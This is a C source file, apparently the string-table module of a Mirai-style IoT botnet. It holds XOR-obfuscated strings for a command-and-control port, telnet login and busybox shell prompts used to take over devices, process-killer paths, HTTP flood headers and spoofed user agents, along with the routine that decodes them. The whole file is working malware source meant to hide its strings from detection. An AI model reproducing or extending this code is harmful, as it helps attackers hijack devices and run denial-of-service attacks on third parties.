#define _GNU_SOURCE

#ifdef DEBUG
#include <stdio.h>
#endif
#include <stdint.h>
#include <stdlib.h>

#include "includes.h"
#include "table.h"
#include "util.h"

// 10 table keys you still call me a skid now? -L
uint32_t table_key = 0xdeadbeef;
uint32_t table_key2 = 0x85dab8bf;
uint32_t table_key3 = 0xdeedeebf;
uint32_t table_key4 = 0xdeabbeaf;
uint32_t table_key5 = 0xdbbd45bf;
uint32_t table_key6 = 0x246584ef;
uint32_t table_key7 = 0x85bfe8bf;
uint32_t table_key8 = 0xd68395bf;
uint32_t table_key9 = 0xdbaaaaaf;
uint32_t table_key10 = 0xdaabeef;

struct table_value table[TABLE_MAX_KEYS];

void table_init(void)
{
    add_entry(TABLE_CNC_PORT, "\x57\xDA", 2); // 3456
    add_entry(TABLE_EXEC_SUCCESS, "\x2D\x3F\x7A\x3D\x35\x34\x3F\x7A\x34\x35\x2D\x5A", 12);
    add_entry(TABLE_SCAN_CB_PORT, "\x06\x03", 2); // 23641

    add_entry(TABLE_ATK_VSE, "\x0E\x09\x35\x2F\x28\x39\x3F\x7A\x1F\x34\x3D\x33\x34\x3F\x7A\x0B\x2F\x3F\x28\x23\x5A", 21);
    add_entry(TABLE_ATK_RESOLVER, "\x75\x3F\x2E\x39\x75\x28\x3F\x29\x35\x36\x2C\x74\x39\x35\x34\x3C\x5A", 17);
    add_entry(TABLE_ATK_NSERV, "\x34\x3B\x37\x3F\x29\x3F\x28\x2C\x3F\x28\x7A\x5A", 12);

	add_entry(TABLE_MISC_RAND, "\x3E\x31\x3B\x35\x2D\x30\x3C\x33\x28\x32\x33\x3B\x3E\x6B\x30\x69\x3F\x3E\x30\x31\x3B\x33\x5A", 23);

    add_entry(TABLE_SCAN_SHELL, "\x29\x32\x3F\x36\x36\x5A", 6);
    add_entry(TABLE_SCAN_ENABLE, "\x3F\x34\x3B\x38\x36\x3F\x5A", 7);
    add_entry(TABLE_SCAN_SYSTEM, "\x29\x23\x29\x2E\x3F\x37\x5A", 7);
    add_entry(TABLE_SCAN_SH, "\x29\x32\x5A", 3);
    add_entry(TABLE_SCAN_QUERY, "\x75\x38\x33\x34\x75\x38\x2F\x29\x23\x38\x35\x22\x7A\x12\x13\x0E\x15\x5A", 18);
    add_entry(TABLE_SCAN_RESP, "\x12\x13\x0E\x15\x60\x7A\x3B\x2A\x2A\x36\x3F\x2E\x7A\x34\x35\x2E\x7A\x3C\x35\x2F\x34\x3E\x5A", 23);
    add_entry(TABLE_SCAN_NCORRECT, "\x34\x39\x35\x28\x28\x3F\x39\x2E\x5A", 9);
    add_entry(TABLE_SCAN_PS, "\x75\x38\x33\x34\x75\x38\x2F\x29\x23\x38\x35\x22\x7A\x2A\x29\x5A", 16);
    add_entry(TABLE_SCAN_KILL_9, "\x75\x38\x33\x34\x75\x38\x2F\x29\x23\x38\x35\x22\x7A\x31\x33\x36\x36\x7A\x77\x63\x7A\x5A", 22);
    add_entry(TABLE_SCAN_OGIN, "\x35\x3D\x33\x34\x5A", 5); // ogin
    add_entry(TABLE_SCAN_ENTER, "\x3F\x34\x2E\x3F\x28\x5A", 6); // enter
    add_entry(TABLE_SCAN_ASSWORD, "\x3B\x29\x29\x2D\x35\x28\x3E\x5A", 8); // assword

    add_entry(TABLE_KILLER_MAPS, "\x75\x37\x3B\x2A\x29\x5A", 6);
    add_entry(TABLE_KILLER_PROC, "\x75\x2A\x28\x35\x39\x75\x5A", 7);
    add_entry(TABLE_KILLER_EXE, "\x75\x3F\x22\x3F\x5A", 5);
    add_entry(TABLE_KILLER_FD, "\x75\x3C\x3E\x5A", 4);
    add_entry(TABLE_KILLER_TCP, "\x75\x2A\x28\x35\x39\x75\x34\x3F\x2E\x75\x2E\x39\x2A\x5A", 14);

    add_entry(TABLE_KILLER_ROOT, "\x75\x28\x35\x35\x2E\x75\x5A", 7);
    add_entry(TABLE_KILLER_TMP, "\x75\x2E\x37\x2A\x75\x5A", 6);
    add_entry(TABLE_KILLER_HOME, "\x75\x32\x35\x37\x3F\x75\x5A", 7);
    add_entry(TABLE_KILLER_VAR, "\x75\x2C\x3B\x28\x75\x5A", 6);
    add_entry(TABLE_KILLER_MNT, "\x75\x37\x34\x2E\x75\x5A", 6);

    add_entry(TABLE_ATK_KEEP_ALIVE, "\x19\x35\x34\x34\x3F\x39\x2E\x33\x35\x34\x60\x7A\x31\x3F\x3F\x2A\x77\x3B\x36\x33\x2C\x3F\x5A", 23);
    add_entry(TABLE_ATK_ACCEPT, "\x1B\x39\x39\x3F\x2A\x2E\x60\x7A\x2E\x3F\x22\x2E\x75\x32\x2E\x37\x36\x76\x3B\x2A\x2A\x36\x33\x39\x3B\x2E\x33\x35\x34\x75\x22\x32\x2E\x37\x36\x71\x22\x37\x36\x76\x3B\x2A\x2A\x36\x33\x39\x3B\x2E\x33\x35\x34\x75\x22\x37\x36\x61\x2B\x67\x6A\x74\x63\x76\x33\x37\x3B\x3D\x3F\x75\x2D\x3F\x38\x2A\x76\x70\x75\x70\x61\x2B\x67\x6A\x74\x62\x5A", 83);
    add_entry(TABLE_ATK_ACCEPT_LNG, "\x1B\x39\x39\x3F\x2A\x2E\x77\x16\x3B\x34\x3D\x2F\x3B\x3D\x3F\x60\x7A\x3F\x34\x77\x0F\x09\x76\x3F\x34\x61\x2B\x67\x6A\x74\x62\x5A", 32);
    add_entry(TABLE_ATK_CONTENT_TYPE, "\x19\x35\x34\x2E\x3F\x34\x2E\x77\x0E\x23\x2A\x3F\x60\x7A\x3B\x2A\x2A\x36\x33\x39\x3B\x2E\x33\x35\x34\x75\x22\x77\x2D\x2D\x2D\x77\x3C\x35\x28\x37\x77\x2F\x28\x36\x3F\x34\x39\x35\x3E\x3F\x3E\x5A", 48);
    add_entry(TABLE_ATK_SET_COOKIE, "\x29\x3F\x2E\x19\x35\x35\x31\x33\x3F\x72\x7D\x5A", 12);
    add_entry(TABLE_ATK_REFRESH_HDR, "\x28\x3F\x3C\x28\x3F\x29\x32\x60\x5A", 9);
    add_entry(TABLE_ATK_LOCATION_HDR, "\x36\x35\x39\x3B\x2E\x33\x35\x34\x60\x5A", 10);
    add_entry(TABLE_ATK_SET_COOKIE_HDR, "\x29\x3F\x2E\x77\x39\x35\x35\x31\x33\x3F\x60\x5A", 12);
    add_entry(TABLE_ATK_CONTENT_LENGTH_HDR, "\x39\x35\x34\x2E\x3F\x34\x2E\x77\x36\x3F\x34\x3D\x2E\x32\x60\x5A", 16);
    add_entry(TABLE_ATK_TRANSFER_ENCODING_HDR, "\x2E\x28\x3B\x34\x29\x3C\x3F\x28\x77\x3F\x34\x39\x35\x3E\x33\x34\x3D\x60\x5A", 19);
    add_entry(TABLE_ATK_CHUNKED, "\x39\x32\x2F\x34\x31\x3F\x3E\x5A", 8);
    add_entry(TABLE_ATK_KEEP_ALIVE_HDR, "\x31\x3F\x3F\x2A\x77\x3B\x36\x33\x2C\x3F\x5A", 11);
    add_entry(TABLE_ATK_CONNECTION_HDR, "\x39\x35\x34\x34\x3F\x39\x2E\x33\x35\x34\x60\x5A", 12);
    add_entry(TABLE_ATK_DOSARREST, "\x29\x3F\x28\x2C\x3F\x28\x60\x7A\x3E\x35\x29\x3B\x28\x28\x3F\x29\x2E\x5A", 18);
    add_entry(TABLE_ATK_CLOUDFLARE_NGINX, "\x29\x3F\x28\x2C\x3F\x28\x60\x7A\x39\x36\x35\x2F\x3E\x3C\x36\x3B\x28\x3F\x77\x34\x3D\x33\x34\x22\x5A", 25);

    add_entry(TABLE_HTTP_ONE, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x0D\x33\x34\x3E\x35\x2D\x29\x7A\x14\x0E\x7A\x6B\x6A\x74\x6A\x61\x7A\x0D\x15\x0D\x6C\x6E\x73\x7A\x1B\x2A\x2A\x36\x3F\x0D\x3F\x38\x11\x33\x2E\x75\x6F\x69\x6D\x74\x69\x6C\x7A\x72\x11\x12\x0E\x17\x16\x76\x7A\x36\x33\x31\x3F\x7A\x1D\x3F\x39\x31\x35\x73\x7A\x19\x32\x28\x35\x37\x3F\x75\x6F\x6B\x74\x6A\x74\x68\x6D\x6A\x6E\x74\x6B\x6A\x69\x7A\x09\x3B\x3C\x3B\x28\x33\x75\x6F\x69\x6D\x74\x69\x6C\x5A", 111);
    add_entry(TABLE_HTTP_TWO, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x0D\x33\x34\x3E\x35\x2D\x29\x7A\x14\x0E\x7A\x6B\x6A\x74\x6A\x61\x7A\x0D\x15\x0D\x6C\x6E\x73\x7A\x1B\x2A\x2A\x36\x3F\x0D\x3F\x38\x11\x33\x2E\x75\x6F\x69\x6D\x74\x69\x6C\x7A\x72\x11\x12\x0E\x17\x16\x76\x7A\x36\x33\x31\x3F\x7A\x1D\x3F\x39\x31\x35\x73\x7A\x19\x32\x28\x35\x37\x3F\x75\x6F\x68\x74\x6A\x74\x68\x6D\x6E\x69\x74\x6B\x6B\x6C\x7A\x09\x3B\x3C\x3B\x28\x33\x75\x6F\x69\x6D\x74\x69\x6C\x5A", 111);
    add_entry(TABLE_HTTP_THREE, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x0D\x33\x34\x3E\x35\x2D\x29\x7A\x14\x0E\x7A\x6C\x74\x6B\x61\x7A\x0D\x15\x0D\x6C\x6E\x73\x7A\x1B\x2A\x2A\x36\x3F\x0D\x3F\x38\x11\x33\x2E\x75\x6F\x69\x6D\x74\x69\x6C\x7A\x72\x11\x12\x0E\x17\x16\x76\x7A\x36\x33\x31\x3F\x7A\x1D\x3F\x39\x31\x35\x73\x7A\x19\x32\x28\x35\x37\x3F\x75\x6F\x6B\x74\x6A\x74\x68\x6D\x6A\x6E\x74\x6B\x6A\x69\x7A\x09\x3B\x3C\x3B\x28\x33\x75\x6F\x69\x6D\x74\x69\x6C\x5A", 110);
    add_entry(TABLE_HTTP_FOUR, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x0D\x33\x34\x3E\x35\x2D\x29\x7A\x14\x0E\x7A\x6C\x74\x6B\x61\x7A\x0D\x15\x0D\x6C\x6E\x73\x7A\x1B\x2A\x2A\x36\x3F\x0D\x3F\x38\x11\x33\x2E\x75\x6F\x69\x6D\x74\x69\x6C\x7A\x72\x11\x12\x0E\x17\x16\x76\x7A\x36\x33\x31\x3F\x7A\x1D\x3F\x39\x31\x35\x73\x7A\x19\x32\x28\x35\x37\x3F\x75\x6F\x68\x74\x6A\x74\x68\x6D\x6E\x69\x74\x6B\x6B\x6C\x7A\x09\x3B\x3C\x3B\x28\x33\x75\x6F\x69\x6D\x74\x69\x6C\x5A", 110);
    add_entry(TABLE_HTTP_FIVE, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x17\x3B\x39\x33\x34\x2E\x35\x29\x32\x61\x7A\x13\x34\x2E\x3F\x36\x7A\x17\x3B\x39\x7A\x15\x09\x7A\x02\x7A\x6B\x6A\x05\x6B\x6B\x05\x6C\x73\x7A\x1B\x2A\x2A\x36\x3F\x0D\x3F\x38\x11\x33\x2E\x75\x6C\x6A\x6B\x74\x6D\x74\x6D\x7A\x72\x11\x12\x0E\x17\x16\x76\x7A\x36\x33\x31\x3F\x7A\x1D\x3F\x39\x31\x35\x73\x7A\x0C\x3F\x28\x29\x33\x35\x34\x75\x63\x74\x6B\x74\x68\x7A\x09\x3B\x3C\x3B\x28\x33\x75\x6C\x6A\x6B\x74\x6D\x74\x6D\x5A", 117);
 



/*  add_entry(TABLE_HTTP_6, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x39\x35\x37\x2A\x3B\x2E\x33\x38\x36\x3F\x61\x7A\x11\x35\x34\x2B\x2F\x3F\x28\x35\x28\x75\x69\x74\x6A\x61\x7A\x33\x6C\x62\x6C\x7A\x16\x33\x34\x2F\x22\x61\x7A\x68\x6A\x6A\x68\x6B\x6B\x6B\x6D\x73\x5A", 62);
    add_entry(TABLE_HTTP_7, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x0D\x33\x34\x3E\x35\x2D\x29\x7A\x14\x0E\x7A\x6C\x74\x6B\x61\x7A\x0D\x15\x0D\x6C\x6E\x73\x7A\x09\x31\x23\x2A\x3F\x0F\x28\x33\x0A\x28\x3F\x2C\x33\x3F\x2D\x7A\x0A\x28\x3F\x2C\x33\x3F\x2D\x75\x6A\x74\x6F\x76\x5A", 65);
    add_entry(TABLE_HTTP_8, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x33\x0A\x32\x35\x34\x3F\x61\x7A\x0F\x61\x7A\x19\x0A\x0F\x7A\x15\x09\x7A\x69\x05\x68\x7A\x36\x33\x31\x3F\x7A\x17\x3B\x39\x7A\x15\x09\x7A\x02\x61\x7A\x3F\x34\x77\x2F\x29\x73\x7A\x1B\x2A\x2A\x36\x3F\x0D\x3F\x38\x11\x33\x2E\x75\x6F\x69\x6B\x74\x68\x6B\x74\x6B\x6A\x7A\x72\x11\x12\x0E\x17\x16\x76\x7A\x36\x33\x31\x3F\x7A\x1D\x3F\x39\x31\x35\x73\x7A\x0C\x3F\x28\x29\x33\x35\x34\x75\x6E\x74\x6A\x74\x6E\x7A\x17\x35\x38\x33\x36\x3F\x75\x6D\x18\x69\x69\x6E\x38\x7A\x09\x3B\x3C\x3B\x28\x33\x75\x6F\x69\x6B\x74\x68\x6B\x74\x6B\x6A\x5A", 144);
    add_entry(TABLE_HTTP_9, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x1D\x3B\x36\x3F\x35\x34\x75\x6B\x74\x6A\x74\x69\x7A\x72\x02\x6B\x6B\x61\x7A\x16\x33\x34\x2F\x22\x7A\x33\x6C\x62\x6C\x61\x7A\x0F\x61\x73\x7A\x1D\x3F\x39\x31\x35\x75\x6A\x5A", 55);
    add_entry(TABLE_HTTP_10, "\x15\x2A\x3F\x28\x3B\x75\x63\x74\x63\x63\x7A\x72\x02\x6B\x6B\x61\x7A\x0F\x61\x7A\x29\x31\x73\x5A", 24);
    add_entry(TABLE_HTTP_11, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6C\x74\x6A\x7A\x72\x1C\x2F\x2E\x2F\x28\x3F\x7A\x09\x2E\x3B\x28\x7A\x0E\x3F\x39\x32\x34\x35\x36\x35\x3D\x33\x3F\x29\x7A\x19\x35\x28\x2A\x74\x7A\x09\x2E\x3B\x28\x77\x18\x36\x3B\x3E\x3F\x7A\x15\x09\x61\x7A\x0F\x61\x7A\x3F\x34\x77\x0F\x09\x73\x7A\x33\x14\x3F\x2E\x7A\x18\x28\x35\x2D\x29\x3F\x28\x7A\x68\x74\x6F\x5A", 86);
    add_entry(TABLE_HTTP_12, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x72\x33\x0A\x3B\x3E\x61\x7A\x0F\x61\x7A\x19\x0A\x0F\x7A\x33\x0A\x32\x35\x34\x3F\x7A\x15\x09\x7A\x69\x05\x68\x7A\x36\x33\x31\x3F\x7A\x17\x3B\x39\x7A\x15\x09\x7A\x02\x61\x7A\x3F\x34\x77\x2F\x29\x73\x7A\x1B\x2A\x2A\x36\x3F\x0D\x3F\x38\x11\x33\x2E\x75\x6F\x69\x6B\x74\x68\x6B\x74\x6B\x6A\x7A\x72\x11\x12\x0E\x17\x16\x76\x7A\x36\x33\x31\x3F\x7A\x1D\x3F\x39\x31\x35\x73\x7A\x0C\x3F\x28\x29\x33\x35\x34\x75\x6E\x74\x6A\x74\x6E\x7A\x17\x35\x38\x33\x36\x3F\x75\x6D\x18\x69\x6B\x6E\x7A\x09\x3B\x3C\x3B\x28\x33\x75\x6F\x69\x6B\x74\x68\x6B\x74\x6B\x6A\x3D\x33\x34\x05\x36\x33\x38\x74\x39\x39\x5A", 157);
    add_entry(TABLE_HTTP_13, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x0D\x33\x34\x3E\x35\x2D\x29\x61\x7A\x0F\x61\x7A\x0D\x33\x34\x7A\x63\x22\x7A\x6E\x74\x63\x6A\x61\x7A\x09\x1D\x61\x7A\x28\x2C\x60\x6B\x74\x63\x74\x68\x74\x6E\x73\x7A\x1D\x3F\x39\x31\x35\x75\x68\x6A\x6B\x6A\x6B\x6B\x6A\x6E\x7A\x14\x3F\x2E\x29\x39\x3B\x2A\x3F\x75\x63\x74\x6B\x74\x6A\x68\x62\x6F\x5A", 87);
    add_entry(TABLE_HTTP_14, "\x18\x36\x3B\x39\x31\x18\x3F\x28\x28\x23\x6D\x6F\x68\x6A\x75\x6E\x74\x6A\x74\x6A\x7A\x0A\x28\x35\x3C\x33\x36\x3F\x75\x17\x13\x1E\x0A\x77\x68\x74\x6A\x7A\x19\x35\x34\x3C\x33\x3D\x2F\x28\x3B\x2E\x33\x35\x34\x75\x19\x16\x1E\x19\x77\x6B\x74\x6B\x5A", 61);
    add_entry(TABLE_HTTP_15, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x39\x35\x37\x2A\x3B\x2E\x33\x38\x36\x3F\x61\x7A\x0E\x3F\x36\x3F\x39\x3B\x7A\x0B\x6D\x61\x7A\x18\x28\x3F\x2D\x7A\x69\x74\x6B\x74\x6F\x61\x7A\x0F\x61\x7A\x3F\x34\x73\x7A\x6E\x62\x6A\x02\x62\x6A\x6A\x7A\x16\x1D\x1F\x7A\x0C\x02\x6B\x6B\x6A\x6A\x6A\x5A", 75);
    add_entry(TABLE_HTTP_16, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x33\x0A\x32\x35\x34\x3F\x61\x7A\x0F\x61\x7A\x19\x0A\x0F\x7A\x15\x09\x7A\x69\x05\x68\x7A\x36\x33\x31\x3F\x7A\x17\x3B\x39\x7A\x15\x09\x7A\x02\x61\x7A\x3F\x34\x77\x2F\x29\x73\x7A\x1B\x2A\x2A\x36\x3F\x0D\x3F\x38\x11\x33\x2E\x75\x6F\x69\x6B\x74\x68\x6B\x74\x6B\x6A\x7A\x72\x11\x12\x0E\x17\x16\x76\x7A\x36\x33\x31\x3F\x7A\x1D\x3F\x39\x31\x35\x73\x7A\x0C\x3F\x28\x29\x33\x35\x34\x75\x6E\x74\x6A\x74\x6E\x7A\x17\x35\x38\x33\x36\x3F\x75\x6D\x18\x69\x69\x6E\x38\x7A\x09\x3B\x3C\x3B\x28\x33\x75\x6F\x69\x6B\x74\x68\x6B\x74\x6B\x6A\x76\x5A", 145);
    add_entry(TABLE_HTTP_17, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x72\x33\x0A\x3B\x3E\x61\x7A\x0F\x61\x7A\x19\x0A\x0F\x7A\x33\x0A\x32\x35\x34\x3F\x7A\x15\x09\x7A\x69\x05\x68\x7A\x36\x33\x31\x3F\x7A\x17\x3B\x39\x7A\x15\x09\x7A\x02\x61\x7A\x3F\x34\x77\x2F\x29\x73\x7A\x1B\x2A\x2A\x36\x3F\x0D\x3F\x38\x11\x33\x2E\x75\x6F\x69\x6B\x74\x68\x6B\x74\x6B\x6A\x7A\x72\x11\x12\x0E\x17\x16\x76\x7A\x36\x33\x31\x3F\x7A\x1D\x3F\x39\x31\x35\x73\x7A\x0C\x3F\x28\x29\x33\x35\x34\x75\x6E\x74\x6A\x74\x6E\x7A\x17\x35\x38\x33\x36\x3F\x75\x6D\x18\x69\x6B\x6E\x7A\x09\x3B\x3C\x3B\x28\x33\x75\x6F\x69\x6B\x74\x68\x6B\x74\x6B\x6A\x3D\x33\x34\x05\x36\x33\x38\x74\x39\x39\x5A", 157);
    add_entry(TABLE_HTTP_18, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x0D\x33\x34\x3E\x35\x2D\x29\x61\x7A\x0F\x61\x7A\x0D\x33\x34\x3E\x35\x2D\x29\x7A\x14\x0E\x7A\x6C\x74\x6B\x61\x7A\x3F\x34\x61\x7A\x28\x2C\x60\x6B\x74\x63\x74\x6B\x74\x69\x73\x7A\x1D\x3F\x39\x31\x35\x75\x68\x6A\x6A\x63\x6A\x62\x68\x6E\x7A\x5A", 73);
    add_entry(TABLE_HTTP_19, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x39\x35\x37\x2A\x3B\x2E\x33\x38\x36\x3F\x61\x7A\x18\x3F\x39\x35\x37\x3F\x18\x35\x2E\x75\x69\x74\x6A\x61\x7A\x17\x09\x13\x1F\x7A\x6C\x74\x6A\x7A\x39\x35\x37\x2A\x3B\x2E\x33\x38\x36\x3F\x61\x7A\x71\x32\x2E\x2E\x2A\x60\x75\x75\x2D\x2D\x2D\x74\x38\x3F\x39\x35\x37\x3F\x74\x39\x35\x37\x75\x29\x33\x2E\x3F\x05\x35\x2D\x34\x3F\x28\x29\x74\x32\x2E\x37\x36\x73\x5A", 102);
    add_entry(TABLE_HTTP_20, "\x17\x35\x20\x33\x36\x36\x3B\x75\x68\x74\x6A\x7A\x72\x39\x35\x37\x2A\x3B\x2E\x33\x38\x36\x3F\x61\x7A\x1B\x29\x31\x7A\x10\x3F\x3F\x2C\x3F\x29\x75\x0E\x3F\x35\x37\x3B\x61\x7A\x71\x32\x2E\x2E\x2A\x60\x75\x75\x3B\x38\x35\x2F\x2E\x74\x3B\x29\x31\x74\x39\x35\x37\x75\x3F\x34\x75\x3E\x35\x39\x29\x75\x3B\x38\x35\x2F\x2E\x75\x2D\x3F\x38\x37\x3B\x29\x2E\x3F\x28\x29\x74\x29\x32\x2E\x37\x36\x73\x5A", 97);
    add_entry(TABLE_HTTP_21, "\x1C\x1B\x09\x0E\x77\x0D\x3F\x38\x19\x28\x3B\x2D\x36\x3F\x28\x75\x69\x74\x62\x7A\x72\x3B\x2E\x2D\x77\x39\x28\x3B\x2D\x36\x3F\x28\x7A\x3B\x2E\x7A\x3C\x3B\x29\x2E\x7A\x3E\x35\x2E\x7A\x34\x35\x61\x7A\x32\x2E\x2E\x2A\x60\x75\x75\x3C\x3B\x29\x2E\x74\x34\x35\x75\x29\x2F\x2A\x2A\x35\x28\x2E\x75\x39\x28\x3B\x2D\x36\x3F\x28\x74\x3B\x29\x2A\x73\x5A", 85);
    add_entry(TABLE_HTTP_22, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x02\x6B\x6B\x61\x7A\x0F\x61\x7A\x16\x33\x34\x2F\x22\x7A\x33\x6C\x62\x6C\x61\x7A\x34\x36\x61\x7A\x28\x2C\x60\x6B\x74\x62\x74\x6B\x38\x68\x73\x7A\x1D\x3F\x39\x31\x35\x75\x68\x6A\x6A\x6C\x6A\x62\x68\x6B\x7A\x18\x35\x34\x1F\x39\x32\x35\x75\x68\x74\x6A\x38\x68\x7A\x72\x1E\x3F\x38\x33\x3B\x34\x77\x6B\x74\x63\x63\x71\x68\x74\x6A\x38\x68\x71\x3E\x3C\x29\x3D\x77\x6B\x73\x5A", 105);
    add_entry(TABLE_HTTP_23, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6F\x74\x6A\x7A\x72\x39\x35\x37\x2A\x3B\x2E\x33\x38\x36\x3F\x61\x7A\x17\x10\x6B\x68\x38\x35\x2E\x75\x2C\x6B\x74\x68\x74\x6E\x61\x7A\x32\x2E\x2E\x2A\x60\x75\x75\x2D\x2D\x2D\x74\x37\x3B\x30\x3F\x29\x2E\x33\x39\x6B\x68\x74\x39\x35\x74\x2F\x31\x75\x38\x35\x2E\x74\x2A\x32\x2A\x65\x71\x73\x5A", 80);
    add_entry(TABLE_HTTP_24, "\x17\x35\x20\x33\x36\x36\x3B\x75\x6E\x74\x6A\x7A\x72\x39\x35\x37\x2A\x3B\x2E\x33\x38\x36\x3F\x61\x7A\x17\x09\x13\x1F\x7A\x6D\x74\x6A\x61\x7A\x0D\x33\x34\x3E\x35\x2D\x29\x7A\x14\x0E\x7A\x6F\x74\x6B\x61\x7A\x0E\x28\x33\x3E\x3F\x34\x2E\x75\x6E\x74\x6A\x61\x7A\x74\x14\x1F\x0E\x7A\x19\x16\x08\x7A\x6B\x74\x6B\x74\x6E\x69\x68\x68\x61\x7A\x74\x14\x1F\x0E\x7A\x19\x16\x08\x7A\x68\x74\x6A\x74\x6F\x6A\x69\x36\x69\x61\x7A\x74\x14\x1F\x0E\x7A\x19\x16\x08\x7A\x69\x74\x6A\x74\x6E\x6F\x6A\x6C\x74\x68\x6B\x6F\x68\x61\x7A\x74\x14\x1F\x0E\x7A\x19\x16\x08\x7A\x69\x74\x6F\x74\x69\x6A\x6D\x68\x63\x61\x7A\x17\x09\x15\x3C\x3C\x33\x39\x3F\x7A\x6B\x68\x73\x5A", 160);
    add_entry(TABLE_HTTP_25, "\x1D\x35\x35\x3D\x36\x3F\x38\x35\x2E\x75\x68\x74\x6B\x7A\x72\x32\x2E\x2E\x2A\x60\x75\x75\x2D\x2D\x2D\x74\x3D\x35\x35\x3D\x36\x3F\x38\x35\x2E\x74\x39\x35\x37\x75\x38\x35\x2E\x74\x32\x2E\x37\x36\x73\x5A", 50); */
}




void table_unlock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (!val->locked)
    {
        printf("[encryption] Tried to double-unlock value %d\n", id);
        return;
    }
#endif

    toggle_obf(id);
}

void table_lock_val(uint8_t id)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[encryption] Tried to double-lock value\n");
        return;
    }
#endif

    toggle_obf(id);
}

char *table_retrieve_val(int id, int *len)
{
    struct table_value *val = &table[id];

#ifdef DEBUG
    if (val->locked)
    {
        printf("[encryption] Tried to access table.%d but it is locked\n", id);
        return NULL;
    }
#endif

    if (len != NULL)
        *len = (int)val->val_len;
    return val->val;
}

static void add_entry(uint8_t id, char *buf, int buf_len)
{
    char *cpy = malloc(buf_len);

    util_memcpy(cpy, buf, buf_len);

    table[id].val = cpy;
    table[id].val_len = (uint16_t)buf_len;
#ifdef DEBUG
    table[id].locked = TRUE;
#endif
}

static void toggle_obf(uint8_t id)
{
    int i;
    struct table_value *val = &table[id];
    uint8_t k1 = table_key & 0xff,
            k2 = (table_key >> 8) & 0xff,
            k3 = (table_key >> 16) & 0xff,
            k4 = (table_key >> 24) & 0xff,
            k5 = table_key2 & 0xff,
            k6 = (table_key2 >> 8) & 0xff,
            k7 = (table_key2 >> 16) & 0xff,
            k8 = (table_key2 >> 24) & 0xff,
            k9 = table_key3 & 0xff,
            k10 = (table_key3 >> 8) & 0xff,
            k11 = (table_key3 >> 16) & 0xff,
            k12 = (table_key3 >> 24) & 0xff,
            k13 = table_key4 & 0xff,
            k14 = (table_key4 >> 8) & 0xff,
            k15 = (table_key4 >> 16) & 0xff,
            k16 = (table_key4 >> 24) & 0xff,
            k17 = table_key5 & 0xff,
            k18 = (table_key5 >> 8) & 0xff,
            k19 = (table_key5 >> 16) & 0xff,
            k20 = (table_key5 >> 24) & 0xff,
            k21 = table_key6 & 0xff,
            k22 = (table_key6 >> 8) & 0xff,
            k23 = (table_key6 >> 16) & 0xff,
            k24 = (table_key6 >> 24) & 0xff,
            k25 = table_key7 & 0xff,
            k26 = (table_key7 >> 8) & 0xff,
            k27 = (table_key7 >> 16) & 0xff,
            k28 = (table_key7 >> 24) & 0xff,
            k29 = table_key8 & 0xff,
            k30 = (table_key8 >> 8) & 0xff,
            k31 = (table_key8 >> 16) & 0xff,
            k32 = (table_key8 >> 24) & 0xff,
            k33 = table_key9 & 0xff,
            k34 = (table_key9 >> 8) & 0xff,
            k35 = (table_key9 >> 16) & 0xff,
            k36 = (table_key9 >> 24) & 0xff,
            k37 = table_key10 & 0xff,
            k38 = (table_key10 >> 8) & 0xff,
            k39 = (table_key10 >> 16) & 0xff,
            k40 = (table_key10 >> 24) & 0xff;

    for (i = 0; i < val->val_len; i++)
    {
        val->val[i] ^= k1;
        val->val[i] ^= k2;
        val->val[i] ^= k3;
        val->val[i] ^= k4;
        val->val[i] ^= k5;
        val->val[i] ^= k6;
        val->val[i] ^= k7;
        val->val[i] ^= k8;
        val->val[i] ^= k9;
        val->val[i] ^= k10;
        val->val[i] ^= k11;
        val->val[i] ^= k12;
        val->val[i] ^= k13;
        val->val[i] ^= k14;
        val->val[i] ^= k15;
        val->val[i] ^= k16;
        val->val[i] ^= k17;
        val->val[i] ^= k18;
        val->val[i] ^= k19;
        val->val[i] ^= k20;
        val->val[i] ^= k21;
        val->val[i] ^= k22;
        val->val[i] ^= k23;
        val->val[i] ^= k24;
        val->val[i] ^= k25;
        val->val[i] ^= k26;
        val->val[i] ^= k27;
        val->val[i] ^= k28;
        val->val[i] ^= k29;
        val->val[i] ^= k30;
        val->val[i] ^= k31;
        val->val[i] ^= k32;
        val->val[i] ^= k33;
        val->val[i] ^= k34;
        val->val[i] ^= k35;
        val->val[i] ^= k36;
        val->val[i] ^= k37;
        val->val[i] ^= k38;
        val->val[i] ^= k39;
        val->val[i] ^= k40;
    }

#ifdef DEBUG
    val->locked = !val->locked;
#endif
}